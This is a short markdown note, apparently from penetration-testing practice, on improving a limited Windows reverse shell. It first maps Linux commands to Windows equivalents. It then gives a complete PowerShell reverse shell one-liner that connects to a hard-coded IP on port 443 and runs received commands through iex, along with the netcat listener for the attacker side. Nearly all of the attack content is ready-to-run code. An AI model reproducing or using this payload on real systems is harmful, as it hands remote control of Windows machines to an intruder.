# Fixing Limited Windows Reverse Shell Commands

## 📌 Issue
After obtaining a Windows reverse shell, you may notice:
- `whoami` works, but `ls`, `cd`, and `id` do not.
- Commands do not behave interactively.

- Use alternatives:
  -   ls -> dir
  -   id -> whoami /user
  -   pwd -> echo %cd%


## 🛠️ Solutions

### ✅ 1. Use a PowerShell Reverse Shell
PowerShell provides a fully interactive shell.

On the Target (Windows), execute:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.227',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
On the Attacker Machine (Kali/Linux), start a listener:

```
nc -lvnp 443
```
